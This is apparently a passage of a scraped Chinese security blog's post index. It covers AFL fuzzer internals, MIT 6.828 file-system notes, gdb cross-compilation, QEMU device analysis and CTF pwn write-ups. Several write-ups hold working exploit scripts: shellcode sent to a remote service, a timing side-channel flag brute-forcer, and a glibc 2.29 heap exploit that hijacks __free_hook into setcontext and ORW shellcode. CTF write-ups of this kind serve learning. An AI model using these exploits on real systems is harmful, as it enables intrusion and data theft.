MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA) maybe_add_auto(a_collect, a_len); &#125; else if (cksum != prev_cksum) &#123; /* Otherwise, if the checksum has changed, see if we have something worthwhile queued up, and collect that if the answer is yes. */ if (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA) maybe_add_auto(a_collect, a_len); a_len = 0; prev_cksum = cksum; &#125; /* Continue collecting string, but only if the bit flip actually made any difference - we don't want no-op tokens. */ if (cksum != queue_cur-&gt;exec_cksum) &#123; if (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; 3]; a_len++; &#125; &#125; &#125; new_hit_cnt = queued_paths + unique_crashes; stage_finds[STAGE_FLIP1] += new_hit_cnt - orig_hit_cnt; stage_cycles[STAGE_FLIP1] += stage_max; 后面跟着的就是2比特2比特的逐个翻转，4比特4比特位移是1位的逐个翻转，然后是1字节1字节的翻转等等等。。。。总之是长度不一，步长不同的比特反转。 在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。 不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关： 123456/* Minimum input file length at which the effector logic kicks in: */#define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */#define EFF_MAX_PERC 90 即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。 后面仍有arithmetic，interest，dictionary，havoc，splice，cycle等变异手段。具体可以参考https://rk700.github.io/2018/01/04/afl-mutations/ 此处不再赘述。 总而言之，AFL的变异策略既有逐位变异的运气成分，同时也合理运用了覆盖率反馈的信息来启发性的创造token 和 effort map 等概念，帮助算法更好的进行变异。 3.2 save_if_interesting覆盖率反馈信息除了一定程度上可以启发性的指导变异以外，最大作用就是在这个函数内实现的选种功能。 如果这个has_new_bits返回为0的话，那么该函数直接返回0，程序继续进行下一次的fuzz。但是如果发现了新的cov信息或者bb信息，那么就会将产生新路径的testcase保存为新的种子。 1234if (!(hnb = has_new_bits(virgin_bits))) &#123; if (crash_mode) total_crashes++; return 0; &#125; 代表current 是刚刚返回的覆盖率信息,virgin_map是当前我们的覆盖率状态。可以注意到virgin_map在setup_shm过程中被初始化成了全 1 , 代表current的trace_bits 初始化状态是全0的状态。根据插桩部分的逻辑，每有新的覆盖率信息，会在相应的trace_bits索引位置加一。 12memset(virgin_bits, 255, MAP_SIZE);memset(trace_bits, 0, MAP_SIZE); 每个trace_bits对应索引里的值其实就代表着走到这条路径的次数，当第1，4，8，128次走到这条路径时，current里的值就是0，而virgin_map里的值则是ff，此时函数将返回2。其余情况都会返回1。最后将current里的值取反，然后与vrigin相与，更新virgin的状态。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/* Check if the current execution path brings anything new to the table. Update virgin bits to reflect the finds. Returns 1 if the only change is the hit-count for a particular tuple; 2 if there are new tuples seen. Updates the map, so subsequent calls will always return 0. This function is called after every exec() on a fairly large buffer, so it needs to be fast. We do this in 32-bit and 64-bit flavors. */static inline u8 has_new_bits(u8* virgin_map) &#123;#ifdef WORD_SIZE_64 u64* current = (u64*)trace_bits; u64* virgin = (u64*)virgin_map; u32 i = (MAP_SIZE &gt;&gt; 3);#else u32* current = (u32*)trace_bits; u32* virgin = (u32*)virgin_map; u32 i = (MAP_SIZE &gt;&gt; 2);#endif /* ^WORD_SIZE_64 */ u8 ret = 0; while (i--) &#123; /* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap that have not been already cleared from the virgin map - since this will almost always be the case. */ if (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin)) &#123; if (likely(ret &lt; 2)) &#123; u8* cur = (u8*)current; u8* vir = (u8*)virgin; /* Looks like we have not found any new bytes yet; see if any non-zero bytes in current[] are pristine in virgin[]. */#ifdef WORD_SIZE_64 if ((cur[0] &amp;&amp; vir[0] == 0xff) || (cur[1] &amp;&amp; vir[1] == 0xff) || (cur[2] &amp;&amp; vir[2] == 0xff) || (cur[3] &amp;&amp; vir[3] == 0xff) || (cur[4] &amp;&amp; vir[4] == 0xff) || (cur[5] &amp;&amp; vir[5] == 0xff) || (cur[6] &amp;&amp; vir[6] == 0xff) || (cur[7] &amp;&amp; vir[7] == 0xff)) ret = 2; else ret = 1;#else if ((cur[0] &amp;&amp; vir[0] == 0xff) || (cur[1] &amp;&amp; vir[1] == 0xff) || (cur[2] &amp;&amp; vir[2] == 0xff) || (cur[3] &amp;&amp; vir[3] == 0xff)) ret = 2; else ret = 1;#endif /* ^WORD_SIZE_64 */ &#125; *virgin &amp;= ~*current; &#125; current++; virgin++; &#125; if (ret &amp;&amp; virgin_map == virgin_bits) bitmap_changed = 1; return ret;&#125; 0x04 参考AFL源码分析（I）——白盒模式下的afl-gcc分析 - 安全客，安全资讯平台 (anquanke.com) [AFL内部实现细节小记](","tags":[{"name":"fuzz","slug":"fuzz","permalink":"wood1314.github.io/tags/fuzz/"}]},{"title":"ByteCtf writeup","date":"2021-10-17T10:00:00.000Z","path":"year/10/17/cl6ewld8m000bj63f1braxamh/","text":"这个题主要是熟悉一下智能指针的使用，以及可能会出现的相关漏洞 智能指针的原理是，接受一个申请好的内存地址，构造一个保存在栈上的智能指针对象，当程序退出栈的作用域范围后，由于栈上的变量自动被销毁，智能指针内部保存的内存也就被释放掉了（除非将智能指针保存起来）。 C++11提供了三种智能指针：std::shared_ptr, std::unique_ptr, std::weak_ptr，使用时需添加头文件 。 shared_ptr使用引用计数，每一个shared_ptr的拷贝都指向相同的内存。每使用他一次，内部的引用计数加1，每析构一次，内部的引用计数减1，减为0时，删除所指向的堆内存。shared_ptr内部的引用计数是安全的，但是对象的读取需要加锁。 bytezoom","tags":[]},{"title":"MIT6.828 lab5","date":"2021-10-17T09:36:16.000Z","path":"year/10/17/cl6ewld95000xj63fks9to3s2/","text":"关于文件系统的lab File system preliminaries我们要完成一个相对简单的文件系统，其可以实现创建、读、写以及删除在分层目录结构中组织的文件。目前我们的OS只支持单用户，因此我们的文件系统也不支持UNIX文件拥有或权限的概念。同时也不支持硬链接、符号链接、时间戳或是特别的设备文件。 On-Disk File System Structure大多是 Unix 文件系统将磁盘空间分为 inode和数据 区域。目录包含文件名和指向inode的指针; 如果文件系统中的多个目录引用该文件的inode，则称文件是硬链接的。由于我们的文件系统不需要支持硬链接，因此我们不需要这一间接层并且能做一个方便的简化：我们的文件系统根本不使用inode，相反我们仅仅将所有文件(或子目录)的 meta-data存储在描述该文件的唯一的目录中(directory entry)。 文件和目录逻辑上都是由一系列数据blocks组成，这些blocks分散在磁盘中，文件系统屏蔽blocks分布的细节，提供一个可以顺序读写文件的接口。 补充 inode操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。 文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做*inode*，中文译名为”*索引节点*“。 具体包括以下内容 12345678910111213* 文件的字节数 * 文件拥有者的User ID * 文件的Group ID * 文件的读、写、执行权限 * 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 * 链接数，即有多少文件名指向这个inode * 文件数据block的位置 每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 每个inode都有一个号码，操作系统用inode号码来识别不同的文件。 这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。 表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。 Sectors and Blocks大部分磁盘都是以Sector为粒度进行读写，JOS中Sectors为512字节。文件系统以block为单位分配和使用磁盘。注意区别，sector size是磁盘的属性，block size是操作系统使用磁盘的粒度。JOS的文件系统的block size被定为4096字节 ( 4kB ) 。 Superblocks我们的文件系统使用一个superblock，位于磁盘的block 1。block 0被用来保存boot loader和分区表。 我们的文件系统使用一个superblock，位于磁盘的block 1。block 0被用来保存boot loader和分区表。 12345struct Super &#123; uint32_t s_magic; // Magic number: FS_MAGIC uint32_t s_nblocks; // Total number of blocks on disk struct File s_root; // Root directory node&#125;; File Meta-data我们的文件系统使用struct File结构描述文件，该结构包含文件名，大小，类型，保存文件内容的block号。struct File结构的f_direct数组保存前NDIRECT（10）个block号，这样对于10*4096=40KB的文件不需要额外的空间来记录内容block号。对于更大的文件我们分配一个额外的block来保存4096/4=1024 block号。 1234567891011121314inc/fs.h struct File &#123; char f_name[MAXNAMELEN]; // filename off_t f_size; // file size in bytes uint32_t f_type; // file type // Block pointers. // A block is allocated iff its value is != 0. uint32_t f_direct[NDIRECT]; // direct blocks uint32_t f_indirect; // indirect block // Pad out to 256 bytes; must do arithmetic in case we're compiling // fsformat on a 64-bit machine. uint8_t f_pad[256 - MAXNAMELEN - 8 - 4*NDIRECT - 4];&#125; __attribute__((packed)); // required only on some 64-bit machines Directories versus Regular FilesFile结构既能代表文件也能代表目录，由type字段区分，文件系统以相同的方式管理文件和目录，只是目录文件的内容是一系列File结构，这些File结构描述了在该目录下的文件或者子目录。超级块中包含一个File结构，代表文件系统的根目录。 The Block Cache我们的文件系统最大支持3GB，文件系统进程保留从0x10000000 (DISKMAP)到0xD0000000 (DISKMAP+DISKMAX)固定3GB的内存空间作为磁盘的缓存。比如block 0被映射到虚拟地址0x10000000，block 1被映射到虚拟地址0x10001000以此类推。 由于我们的文件系统有独立于系统中其他环境的虚拟地址空间（不重叠），因为我们的文件系统唯一需要做的事是实现文件的 access。如此看来我们为文件系统保留大量的空间也是十分合理的。 如果将整个磁盘全部读到内存将非常耗时，所以我们将实现按需加载，只有当访问某个block对应的内存地址时出现页错误，才将该block从磁盘加载到对应的内存区域，然后重新执行内存访问指令。 The file system interface到目前为止，文件系统进程已经能提供各种操作文件的功能了，但是其他用户进程不能直接调用这些函数。我们通过进程间函数调用(RPC)对其它进程提供文件系统服务。RPC机制原理如下： RPC（Remote Procedure Call ） 12345678910111213141516171819Regular env FS env +---------------+ +---------------+ | read | | file_read | | (lib/fd.c) | | (fs/fs.c) |...|.......|.......|...|.......^.......|............... | v | | | | RPC mechanism | devfile_read | | serve_read | | (lib/file.c) | | (fs/serv.c) | | | | | ^ | | v | | | | | fsipc | | serve | | (lib/file.c) | | (fs/serv.c) | | | | | ^ | | v | | | | | ipc_send | | ipc_recv | | | | | ^ | +-------|-------+ +-------|-------+ | | +-------------------+ 本质上RPC还是借助IPC机制实现的。 在开始时，read只需调度到适当的设备读取函数，就可以适用于任何文件描述符，在本例中为devfile_read（我们可以有更多的设备类型，如管道）。 devfile_read专门为磁盘文件实现读取。 这个和lib / file.c中的其他devfile_ *函数实现了FS操作的客户端，并且所有工作都以大致相同的方式工作，在请求结构体中捆绑参数，调用fsipc发送IPC请求，以及解包和返回 结果。 fsipc函数只处理向服务器发送请求和接收回复的常见细节。 相关数据结构之间的关系可用下图来表示： Sharing library state across fork and spawn通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。 总结回顾 通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。 引入一个文件系统进程的特殊进程，该进程提供文件操作的接口。具体实现在fs/bc.c，fs/fs.c，fs/serv.c中。 建立RPC机制，客户端进程向FS进程发送请求，FS进程真正执行文件操作。客户端进程的实现在lib/file.c，lib/fd.c中。客户端进程和FS进程交互可总结为下图 支持从磁盘加载程序并运行。实现spawn()，该函数创建一个新的进程，并从磁盘加载程序运行，类似UNIX中的fork()后执行exec()。","tags":[{"name":"6.828","slug":"6-828","permalink":"wood1314.github.io/tags/6-828/"}]},{"title":"能源赛 wp","date":"2021-10-16T03:05:44.000Z","path":"year/10/16/cl6ewldbk0060j63fws01kf36/","text":"主要是看到的shellcode的骚操作 easyHtpp题⽬是⼀道简单http服务器，经过检查POST参数是/tryShellcode之后会执⾏shellcode，构造 body⻓度和我们shellcode⻓度相同后再绕过沙盒保护对system的限制即可 1234567891011121314151617from pwn import *context.os = 'linux'context.arch = 'amd64'#sh = process('./easyHttp')sh = remote('106.14.120.231',29792)def makeHeader(shellcode):return \"POST /tryShellcode HTTP/1.0\\r\\nContent-Length: \" + str(len(shelldef Login():return \"POST /login HTTP/1.0\\r\\nNAME: 1\\nPass: 1\\r\\n\\r\\n\"# gdb.attach(sh,'b* $rebase(0x1F0F)')sh.recvuntil('test&gt; \\n')sh.sendline(Login())sh.recvuntil('test&gt; \\n')shellcode = asm(shellcraft.cat(\"flag\", fd=1))payload = makeHeader(shellcode)sh.sendline(payload)sh.interactive() 这个题比较有意思的就是shellcraf.cat的那个操作，没有使用read系统调用，可以说是另一种orw,从汇编里可以看到采用了sendfile这个系统调用 123456789101112131415161718192021222324&gt;&gt;&gt; print shellcraft.cat(&quot;flag&quot;) /* push &apos;flag\\x00&apos; */ push 1 dec byte ptr [esp] push 0x67616c66 /* open(file=&apos;esp&apos;, oflag=&apos;O_RDONLY&apos;, mode=0) */ mov ebx, esp xor ecx, ecx xor edx, edx /* call open() */ push SYS_open /* 5 */ pop eax int 0x80 /* sendfile(out_fd=1, in_fd=&apos;eax&apos;, offset=0, count=0x7fffffff) */ push 1 pop ebx mov ecx, eax xor edx, edx push 0x7fffffff pop esi /* call sendfile() */ xor eax, eax mov al, 0xbb int 0x80 babyshellcode基本同2020年天翼杯safebox原题，2021年蓝帽杯线下原题，找到⽹上wp修改⼀些关键部分地 址，采⽤侧信道⽅式爆破flag即可。网上模版还是用的不顺手，还是记一下自己的模板吧。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import * EXCV = context.binary = './chall'e = ELF(EXCV)context.arch = 'amd64'context.os = 'linux' if args.I: context.log_level = 'debug' def pwn(p, index, ch): shellcode = ''' xor rdi, rdi; push 0x10100; pop rsi; push 0x100; pop rdx; syscall; jmp rsi; ''' p.recvuntil('Are you a shellcode master?\\n') p.send(asm(shellcode).ljust(0x18,b'a')) # open shellcode = \"mov rax, 0x67616c662f2e; push rax; mov rdi,rsp;\" shellcode += \"xor esi, esi; xor rdx, rdx;\" shellcode += \"push 2; pop rax; syscall;\" # shellcode = \"push 0x10032aaa; pop rdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;\" # re open, rax =&gt; 4 shellcode += \"push 2; pop rax; syscall;\" # read(rax, 0x10040, 0x50) shellcode += \"mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;\" # cmp and jz if index == 0: shellcode += \"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret\".format(index, ch) else: shellcode += \"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret\".format(index, ch) shellcode = asm(shellcode) p.send(shellcode.ljust(0x100-14, b'a') + b'/home/pwn/flag') index = 0ans = []while True: for ch in range(0x20, 127): if args.R: p = remote('106.14.120.231',28444) else: p = process(EXCV) pwn(p, index, ch) start = time.time() try: p.recv(timeout=2) except: pass end = time.time() p.close() if end-start &gt; 1.5: ans.append(ch) print(\"\".join([chr(i) for i in ans])) break else: print(\"\".join([chr(i) for i in ans])) break index = index + 1print(\"\".join([chr(i) for i in ans]))# p = process(EXCV)# gdb.attach(p)# pwn(p,0, 0x20)","tags":[]},{"title":"长城杯writeup","date":"2021-10-14T15:37:01.000Z","path":"year/10/14/cl6ewldbs006jj63f85nze3p7/","text":"当时没时间写，后面用自己本地2.29libc的环境复现了下，libc2.29打free_hook orw的模板 0x01 题目描述libc2.29 具有doble free的漏洞，具有add，show，edit，delete的功能，但只能申请0x60大小以下的堆块，并且需要orw 0x02 思路 泄漏堆地址后，修改一个chunk的size大于0x440,free掉后从而泄漏libc地址 在堆上布置好shellcode，frame内容后把 free_hook更改为2.29特殊的gadget，然后free掉一个堆快来设置rdi和rdx 0x03 小trick搜索2.29 从rdi转到rdx的gadget 1ropper -f ./libc-2.29.so --search 'mov rdx'|grep \"rdi + 8\" 0x04 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154from pwn import *sh = process('./pwn')context.terminal = ['tmux', 'splitw', '-h']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#sh = remote('47.104.175.110',20066)context.log_level = 'debug'context.arch = 'amd64'context.os = 'linux'libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def menu(choice): sh.recvuntil(\"&gt;&gt; \\n\") sh.sendline(str(choice))def add(idx, size): menu(1) sh.recvuntil('input index:\\n') sh.sendline(str(idx)) sh.recvuntil('input size:\\n') sh.sendline(str(size))def move(idx): menu(2) sh.recvuntil('input index:\\n') sh.sendline(str(idx))def edit(idx, content): menu(3) sh.recvuntil('input index:\\n') sh.sendline(str(idx)) sh.recvuntil('context:\\n') sh.send(content)def show(idx): menu(4) sh.recvuntil('\\n') sh.sendline(str(idx))#gdb.attach(sh)add(0, 0x60)for i in range(15): add(1, 0x40)move(0)show(0)heap_base = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x9f0log.success('heap_base: ' + hex(heap_base))for i in range(15): add(2, 0x40)move(1)edit(0, p64(heap_base + 0x1210-0x10) + '\\n')add(2, 0x60)add(2, 0x60)edit(2, p64(0) + p64(0x4f1-0x50+0x10) + '\\n')# add(1,0x40)move(1)show(1)libc_base = u64(sh.recvuntil('\\n')[:-1].ljust(8,'\\x00')) - 0x1e4ca0log.success(\"libc_base: \" + hex(libc_base))IO_file_jumps = 0x1e6560 + libc_baseIO_str_jumps = libc_base + 0x1e6620binsh_addr = libc.search(\"/bin/sh\").next()stdout_file = libc_base + 0x1e5680shellcode = '''mov rax,0x67616c662f2epush raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''frame = SigreturnFrame()frame.rsp = heap_base + 0x2500frame.rdi = heap_baseframe.rsi = 0x5000frame.rdx = 4 | 2 | 1frame.rip = libc.sym['mprotect'] + libc_basepayload = str(frame)for i in range(0, len(str(frame)), 0x60): move(0) edit(0, p64(heap_base + 0x2000 + i) + '\\n') add(1, 0x60) add(1, 0x60) edit(1, payload[i:i+0x60])shellcode =p64(heap_base + 0x2500 + 8) + asm(shellcode)for i in range(0, len(shellcode), 0x60): move(0) edit(0, p64(heap_base + 0x2500 +i) + '\\n') add(1, 0x60) add(1,0x60) edit(1, shellcode[i:i+0x60])free_hook = libc_base + libc.sym[\"__free_hook\"]gadget = 0x12be97 + libc_baseset_contextaddr = libc_base + libc.sym['setcontext']move(0)edit(0, p64(0)*2 + '\\n')move(0)edit(0, p64(heap_base + 0x3000 +i) + '\\n')add(1, 0x60)add(1, 0x60)edit(1,p64(set_contextaddr+53) + p64(heap_base + 0x2000))move(0)edit(0, p64(0)*2 + '\\n')move(0)edit(0, p64(free_hook) + '\\n')add(2, 0x60)add(2, 0x60)edit(2, p64(gadget))move(1)sh.interactive() https://oneda1sy.gitee.io/2021/05/24/heap-Plain-SeccompAttack2.29/ https://wood1314.github.io/year/04/06/cklza4rcn000dalu506tx8974/#more https://darkeyer.github.io/2020/08/17/FSOP在glibc2.29中的利用/","tags":[{"name":"pwn writeup","slug":"pwn-writeup","permalink":"wood1314.github.io/tags/pwn-writeup/"}]},{"title":"gdb交叉编译","date":"2021-10-13T15:43:48.000Z","path":"year/10/13/cl6ewlda10028j63f68lz4mid/","text":"最近在编译gdb和交叉编译gdb的时候学习到的一些东西 0x01 configure、 make、 make install 背后的原理123./configuremakemake install 接下来让我们深入 Unix 去搞清楚这几行命令的作用。 做了什么整个过程分为三步： 配置 configure 脚本负责在你使用的系统上准备好软件的构建环境。确保接下来的构建和安装过程所需要的依赖准备好，并且搞清楚使用这些依赖需要的东西。 Unix 程序一般是用 C 语言写的，所以我们通常需要一个 C 编译器去构建它们。在这个例子中 configure 要做的就是确保系统中有 C 编译器，并确定它的名字和路径。 构建 当 configure 配置完毕后，可以使用 make 命令执行构建。这个过程会执行在 Makefile 文件中定义的一系列任务将软件源代码编译成可执行文件。 你下载的源码包一般没有一个最终的 Makefile 文件，一般是一个模版文件 Makefile.in 文件，然后 configure 根据系统的参数生成一个定制化的 Makefile 文件。 安装 现在软件已经被构建好并且可以执行，接下来要做的就是将可执行文件复制到最终的路径。make install 命令就是将可执行文件、第三方依赖包和文档复制到正确的路径。 这通常意味着，可执行文件被复制到某个 PATH 包含的路径，程序的调用文档被复制到某个 MANPATH 包含的路径，还有程序依赖的文件也会被存放在合适的路径。 因为安装这一步也是被定义在 Makefile 中，所以程序安装的路径可以通过 configure 命令的参数指定，或者 configure 通过系统参数决定。 如果要将可执行文件安装在系统路径，执行这步需要赋予相应的权限，一般是通过 sudo。 安装过程简单说就是 configure 脚本根据系统信息将 Makefile.in 模版文件转换为 Makefile文件 1.1 -build –host –target源码经过编译生成可执行程序。根据执行编译操作的平台、可执行程序的运行平台、可执行的程序的处理平台，可以将编译操作分为多种类型，对应的三个配置参数如下： –build：运行编译工具链的平台，也就是正在执行编译操作的平台。如果未指定此参数，则通过 config.guess 猜测得到。通常都不指定此参数。 -host：可执行程序将运行的平台。如果未指定此参数，则和 –build 相同。如果 --host 和 --build 不同，是交叉编译；否则是普通编译。 -target：可执行程序将处理的平台。如果未指定此参数，则和 –host 相同。一般来说，程序运行在什么平台，处理的就是什么平台，此参数值和 –host 参数相同，不需显式指定，所以通常不会关注到此参数。但在制作交叉编译工具 (如 gcc、gdb 等) 这种特殊情况下，此值和 –host 不同，例如交叉编译器 arm-linux-gcc，它运行在 x86-linux 平台 (–host 参数)，但处理的是 arm-linux 平台 (–target 参数)。如果是交叉编译一个普通的应用，如运行于 arm-linux 平台的 tftp 程序，则它的运行平台和处理平台都是 arm-linux 平台。 1.2交叉编译gdb(mips 架构)如果是交叉编译gdb，只设置host参数就可以了。target默认会和host参数相同。 1sudo ./configure --host=mipsel-openwrt-linux CC=mipsel-linux-gnu-gcc CXX=mipsel-linux-gnu-g++ CFLAGS=-static 1.3 64位环境下编译32位gdb需要依赖libdeflate库，因此先将libdflate库安装到指定文件夹下 12sudo make CFLAGS=\"-m32\"sudo make install DESTDIR=/home/giantbranch/IOT/Tfuzz/test/i386 CFLAGS=\"-m32\" 然后编译gdb clean清除 消除掉原来的cache 重新设置config 在make时指定我们编译libdelate库的位置 1234make cleanfind . -name \"*.cache\" | xargs rm -rf./configure --target=i386-linux CFLAGS=\"-static -m32\"make LDFLAGS+=\"-L /home/giantbranch/IOT/Tfuzz/test/i386/usr/local/lib\" 1.4 正常编译64位gdb1234make cleanfind . -name \"*.cache\" | xargs rm -rf./configure CFLAGS=\"-static\"make 1.5 查看交叉编译链适配环境 参考The magic behind configure, make, make install (thoughtbot.com) makefile介绍 — 跟我一起写Makefile 1.0 文档 (seisman.github.io) BuildingCrossGDBandGDBserver - GDB Wiki (sourceware.org) Ubuntu 建立 gdb cross-complier 開發環境 | YuYan’s blog (tsaiyuyan.github.io) IoT安全研究视角的交叉编译 | Clang裁缝店 (xuanxuanblingbling.github.io)","tags":[{"name":"gdb 工具","slug":"gdb-工具","permalink":"wood1314.github.io/tags/gdb-工具/"}]},{"title":"qemu初探","date":"2021-03-07T10:55:03.000Z","path":"year/03/07/cl6ewldal003pj63f2l427z5q/","text":"qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。目前qemu出问题比较多的地方以及比赛中出题目的形式都在在设备模拟中。 所以其实这种题型一般就是关注它描述设备自定义的那个设备结构体还有与这个设备通信的相关函数。 0x01 qemu基础主要参考这篇博客吧qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。 通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。 1.1 查看pci设备12345678ubuntu@ubuntu:~$ lspci00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03) xx:yy:z的格式为总线:设备:功能的格式。 0x02 2021 AntCtf d3dev2.1 设备分析首先可以通过d3dev_class_init来判断它是哪个设备，与lspci列表下的设备对比，发现对应设备是/sys/devices/pci0000:00/0000:00:03.0 然后一般来讲，设备的数据类型IDA是没有自动加载的，需要我们手动加载一下。在IDA-&gt;views-&gt;subview-&gt;localtype里搜索 d3 可以找到这个设备结构体，用了这个结构体以后代码就好看很多了。 2.2 漏洞分析pmio_write首先看pmio_write函数，主要功能就四个 addr为8时设置seek addr为28时调用r_rand函数 addr为4时将key重置 设置memory_mode 12345678910111213141516171819202122232425262728293031323334353637void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; uint32_t *v4; // rbp if ( addr == 8 ) &#123; if ( val &lt;= 0x100 ) opaque-&gt;seek = val; &#125; else if ( addr &gt; 8 ) &#123; if ( addr == 28 ) &#123; opaque-&gt;r_seed = val; v4 = opaque-&gt;key; do *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)( &amp;opaque-&gt;r_seed, 28LL, val, *(_QWORD *)&amp;size); while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r ); &#125; &#125; else if ( addr ) &#123; if ( addr == 4 ) &#123; *(_QWORD *)opaque-&gt;key = 0LL; *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL; &#125; &#125; else &#123; opaque-&gt;memory_mode = val; &#125;&#125; pmio_read然后再分析pmio_read函数，这个函数朴实无华，功能也十分简单。 12345678910uint64_t __fastcall d3dev_pmio_read(void *opaque, hwaddr addr, unsigned int size)&#123; uint64_t result; // rax if ( addr &gt; 0x18 ) result = -1LL; else result = ((__int64 (__fastcall *)(void *))((char *)dword_7ADF30 + dword_7ADF30[addr]))(opaque); return result;&#125; 进入到dword_7ADF30之后算一下偏移发现是一串gadget，基本上的功能就是读那个设备结构体的一些值，比如seek，key之类的。 mmio_write这个有一个越界写漏洞，出现在设置v4这个index的时候这个seek是我们自主可控的，因此会造成越界写。还有一点需要注意的就是，它那个do while实际上是一个解密的过程。x是低32位，y是高32位。 1234567891011121314151617181920212223242526272829303132333435363738394041424344void __fastcall d3dev_mmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123; __int64 v4; // rsi ObjectClass_0 **v5; // r11 uint64_t v6; // rdx int i; // esi uint32_t key0; // er10 uint32_t key1; // er9 uint32_t key2; // er8 uint32_t key3; // edi unsigned int x; // ecx uint64_t y; // rax if ( size == 4 ) &#123; v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3); if ( opaque-&gt;mmio_write_part ) &#123; v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4; v6 = val &lt;&lt; 32; i = 0; opaque-&gt;mmio_write_part = 0; key0 = opaque-&gt;key[0]; key1 = opaque-&gt;key[1]; key2 = opaque-&gt;key[2]; key3 = opaque-&gt;key[3]; x = v6 + *((_DWORD *)v5 + 0x2B6); y = ((unsigned __int64)v5[0x15B] + v6) &gt;&gt; 32; do &#123; i -= 0x61C88647; x += (i + y) ^ (key1 + ((unsigned int)y &gt;&gt; 5)) ^ (key0 + 16 * y); LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; 5)) ^ (key2 + 16 * x)) + y; &#125; while ( i != 0xC6EF3720 ); // range(20) v5[0x15B] = (ObjectClass_0 *)__PAIR64__(y, x); &#125; else &#123; opaque-&gt;mmio_write_part = 1; opaque-&gt;blocks[v4] = (unsigned int)val; &#125; &#125;&#125; mmio_read这个地方跟上面的越界写一样，就是个越界读。然后还会把读出的数据进行一个加密。 12345678910111213141516171819202122232425262728293031323334353637void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr 